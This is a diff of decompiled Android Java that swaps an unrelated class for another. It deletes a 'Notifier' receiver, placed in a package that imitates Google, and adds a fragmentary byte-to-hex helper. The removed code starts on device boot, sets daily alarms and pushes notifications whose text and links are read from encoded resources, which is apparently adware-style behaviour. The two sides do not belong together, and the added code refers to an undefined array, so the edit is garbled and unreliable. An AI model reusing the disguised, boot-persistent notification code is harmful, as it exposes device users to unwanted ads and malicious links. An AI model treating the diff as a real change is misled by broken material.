@@ -1,56 +1,13 @@
-Package Path:com.googleapi.cover.Notifier.Notifier
-Class Name:Notifier
-Java Code: package com.googleapi.cover;
+Package Path:com.secapk.wrapper.Util.toASC
+Class Name:Util
+Java Code: package com.secapk.wrapper;
 
-public class Notifier extends BroadcastReceiver {
-    public static final String ACT_NOTIFY = "ACT_NOTIFY";
-    private static final String KEY_NOTIF_COUNTER = "KEY_NOTIF_COUNTER";
-    private static final int MINS_UNTIL_NOTIFY = 1440;
-    private SharedPreferences settings;
-
-    public void setPrefs(SharedPreferences prefs) {
-        this.settings = prefs;
-    }
-
-    @Override // android.content.BroadcastReceiver
-    public void onReceive(Context context, Intent intent) {
-        int id;
-        this.settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-        String action = intent.getAction();
-        if ((action.equals("android.intent.action.BOOT_COMPLETED") || action.equals(ACT_NOTIFY)) && (id = this.settings.getInt(KEY_NOTIF_COUNTER, 0)) > 0) {
-            showNotification(context, id);
+    public static byte[] toASC(byte[] bts) {
+        byte[] ret = new byte[bts.length * 2];
+        for (int i = 0; i < bts.length; i++) {
+            byte b = bts[i];
+            ret[i * 2] = hexDigits[(b >> 4) & 15];
+            ret[(i * 2) + 1] = hexDigits[b & 15];
         }
+        return ret;
     }
-
-    private void showNotification(Context context, int id) {
-        NotificationManager nm = (NotificationManager) context.getSystemService("notification");
-        try {
-            long time = System.currentTimeMillis();
-            String notificationURL = TextUtils.read(8, context);
-            Intent browserIntent = new Intent("android.intent.action.VIEW", Uri.parse(notificationURL));
-            PendingIntent pi = PendingIntent.getActivity(context, 0, browserIntent, 268435456);
-            String body = TextUtils.read(7, context);
-            String title = TextUtils.read(6, context);
-            Notification notification = new Notification(R.drawable.ic_push, title, time);
-            notification.setLatestEventInfo(context, title, body, pi);
-            notification.flags = 20;
-            Utils.putIntegerValue(context, KEY_NOTIF_COUNTER, this.settings.getInt(KEY_NOTIF_COUNTER, 0) - 1, this.settings);
-            nm.notify(id, notification);
-        } catch (IOException e) {
-        }
-    }
-
-    public void initSettings(Context context, long time, Intent intent) {
-        if (!this.settings.contains(KEY_NOTIF_COUNTER)) {
-            int number = 0;
-            try {
-                number = Integer.parseInt(TextUtils.read(9, context));
-            } catch (Exception e) {
-            }
-            Utils.putIntegerValue(context, KEY_NOTIF_COUNTER, number, this.settings);
-            PendingIntent pi = PendingIntent.getBroadcast(context, 0, intent, 268435456);
-            AlarmManager am = (AlarmManager) context.getSystemService("alarm");
-            am.set(0, 86400000 + time, pi);
-        }
-    }
-}
